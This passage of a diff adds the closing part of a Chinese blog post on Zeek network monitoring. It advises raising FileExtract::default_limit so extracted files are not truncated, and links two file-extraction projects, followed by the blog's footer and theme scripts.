+<p>当启用文件提取时，记得调整Zeek的这个配置，指定最大提取数据大小，否则会出现提取被截段的现象。</p>
+<ul>
+<li>file-extract_limit.zeek</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redef FileExtract::default_limit = <span class="number">5000000000</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><ul>
+<li><p><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/file-extraction-plus">canon/file-extraction-plus</a></strong></p>
+</li>
+<li><p><strong><a target="_blank" rel="noopener" href="https://github.com/hosom/file-extraction/actions">hosom/file-extraction</a></strong></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Zeek/" rel="tag"># Zeek</a>
+              <a href="/tags/NTA/" rel="tag"># NTA</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/11/30/Zeek-Detect-Godzilla-WebShell/" rel="prev" title="Zeek - Detect Godzilla WebShell">
+                  <i class="fa fa-chevron-left"></i> Zeek - Detect Godzilla WebShell
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/01/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%B6%A3%E8%B0%88-1/" rel="next" title="应急响应 - 你该关注哪些指标？">
+                  应急响应 - 你该关注哪些指标？ <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+<script src="/js/comments.js"></script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Canon</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">230k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:29</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
